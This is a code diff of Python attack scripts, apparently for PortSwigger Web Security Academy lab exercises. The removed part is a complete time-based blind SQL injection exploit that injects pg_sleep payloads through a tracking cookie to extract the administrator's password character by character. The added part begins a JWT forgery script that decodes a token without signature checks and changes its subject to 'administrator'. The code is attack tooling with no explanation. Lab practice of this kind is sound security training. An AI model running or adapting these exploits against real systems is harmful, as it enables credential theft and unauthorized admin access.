@@ -1,33 +1,28 @@
-import requests
-import time
+import jwt
+import base64
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
 
-url = "https://0a2400d70355daa981942ae50063006e.web-security-academy.net/filter?category=Gifts"
-cookies = {
-    "TrackingId": "jmXrzZJq1ms1QSkK",
-    "session": "KSOEAdX8r0S1MwFb7YabJzQW8mOUWtMb"
-}
+token = ''
 
-def getTime(payload):
-    cookies_payload = cookies.copy()
-    cookies_payload["TrackingId"] += payload
-    start_time = time.time()
-    response = requests.get(url, cookies=cookies_payload)
-    elapsed_time = time.time() - start_time
-    return elapsed_time
+with open('public_key.pem', 'rb') as f:
+    public_key = serialization.load_pem_public_key(
+        f.read(),
+        backend=default_backend()
+    )
 
-def extractPassword():
-    extracted_password = ""
-    chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"
+decoded_token = jwt.decode(token, options={"verify_signature": False})
+print(f"Decoded token: {decoded_token}")
 
-    for pos in range(1, 21):
-        for char in chars:
-            payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
-            time = getTime(payload)
-            if time > 6:
-                print(f"Found character '{char}' at position {pos}")
-                extracted_password += char
-                break
-    return extracted_password
+decoded_header = jwt.get_unverified_header(token)
+print(f"Decoded header: {decoded_header}\n")
 
-password = extractPassword()
-print(password)
+decoded_token['sub'] = 'administrator'
+print(f"Modified token: {decoded_token}\n")
+
+with open('private_key.pem', 'rb') as f:
+    private_key = serialization.load_pem_private_key(
+        f.read(),
+        password=None,
+        backend=default_backend()
+    )
